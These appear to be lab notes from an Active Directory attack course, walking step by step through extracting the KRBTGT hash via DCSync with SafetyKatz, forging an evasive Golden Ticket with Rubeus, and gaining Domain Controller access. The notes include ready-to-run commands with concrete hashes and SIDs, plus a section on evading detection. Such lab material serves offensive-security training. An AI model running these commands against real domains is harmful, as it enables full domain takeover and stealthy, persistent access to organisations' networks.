# Learning Objective 8 — Golden Ticket Creation & Domain Escalation

**Date:** 01 August 2026

---

## Task 1: Remote Access to dcorp-adminsrv

```powershell
winrs -r:dcorp-adminsrv cmd
```

Opens remote shell on dcorp-adminsrv.

---

## Task 2: Credential Delegation (RunAs)

```powershell
runas /user:dcorp\student1 /netonly cmd
```

Creates new shell with student1 credentials. `/netonly` allows network access without local privilege.

---

## Task 3: Extract KRBTGT Secret via DCSync

Using Loader for evasion:

```powershell
Loader.exe -Path C:\AD\Tools\SafetyKatz.exe -args "lsadump::evasive-dcsync /user:dcorp\krbtgt" "exit"
```

**Breakdown:**
- `Loader.exe` — obfuscated binary delivery
- `SafetyKatz.exe` — Mimikatz variant (memory-only)
- `lsadump::evasive-dcsync` — DCSync without triggering alerts
- Output: KRBTGT AES256 hash

---

## Task 4: Forge Golden Ticket (Evasive)

Using Loader + Rubeus with evasion flags:

```powershell
Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-golden 
  /aes256:154CB6624B1D859F7080A6615ADC488F09F92843879B3D914CBCB5A8C3CDA848 
  /user:Administrator 
  /id:500 
  /pgid:513 
  /domain:dollarcorp.moneycorp.local 
  /sid:S-1-5-21-719815819-3726368948-3917688648 
  /pwdlastset:"11/11/2022 6:33:55 AM" 
  /minpassage:1 
  /logoncount:2453 
  /netbios:dcorp 
  /groups:544,512,520,513 
  /dc:DCORP-DC.dollarcorp.moneycorp.local 
  /uac:NORMAL_ACCOUNT,DONT_EXPIRE_PASSWORD
  /ptt
```

**Key Parameters:**
- `evasive-golden` — Golden ticket with evasion (vs standard `golden`)
- `/aes256` — KRBTGT hash (AES256)
- `/user:Administrator` — Impersonate Administrator
- `/id:500` — Administrator RID
- `/pgid:513` — Domain Users primary group
- `/groups:544,512,520,513` — Local Admins, Domain Admins, Schema Admins, Domain Users
- `/ptt` — Pass-the-ticket (load into memory immediately)

---

## Task 5: Verify Domain Admin Access

Remote into Domain Controller:

```powershell
winrs -r:dcorp-dc cmd
```

Verify Golden ticket is in use:

```powershell
set
```

Shows current security context. Should show elevated/admin access.

---

## Alternative: Get Service Account Ticket

Before golden ticket, optionally get service account ticket:

```powershell
Loader.exe -path Rubeus.exe -args asktgt /user:svcadmin /aes256:<aes256_key> /opsec /createnetonly:cmd.exe /show /ptt
```

**Parameters:**
- `/user:svcadmin` — Service account to impersonate
- `/aes256:<key>` — AES256 hash of service account
- `/opsec` — OPSEC-friendly (minimal LDAP queries)
- `/createnetonly:cmd.exe` — New logon session in cmd.exe
- `/show` — Display ticket info
- `/ptt` — Load into memory

---

## Attack Flow Summary

```
1. Remote into dcorp-adminsrv
   ↓
2. Delegate credentials (runas /netonly)
   ↓
3. Extract KRBTGT hash (DCSync + evasive-dcsync)
   ↓
4. Forge Golden ticket (evasive-golden + Loader)
   ↓
5. Access Domain Controller
   ↓
6. Verify Domain Admin privileges
```

---

## Evasion Techniques Used

**Loader.exe**
- Obfuscated binary delivery
- Bypasses signature-based detection
- Memory-only execution

**evasive-dcsync**
- DCSync without noisy network patterns
- Avoids triggering monitoring tools

**evasive-golden**
- Creates Golden ticket with realistic properties
- Mimics legitimate TGT characteristics
- Harder to detect than standard golden tickets

**runas /netonly**
- No local execution with elevated privileges
- Only affects network authentication
- Harder to detect than full privilege elevation

---

## Key Takeaway

```
Step 1: Get remote access (winrs)
Step 2: Impersonate user (runas /netonly)
Step 3: Extract KRBTGT (DCSync)
Step 4: Forge Golden ticket (Rubeus)
Step 5: Become Domain Admin (persistent access)
```

---

## References

- [Rubeus](https://github.com/GhostPack/Rubeus)
- [SafetyKatz](https://github.com/GhostPack/SafetyKatz)
- [Loader (Obfuscation)](https://github.com/samratashok/CACTUSTORCH)

---

*Next: Learning Objective 9 — Cross-Forest & Persistence*
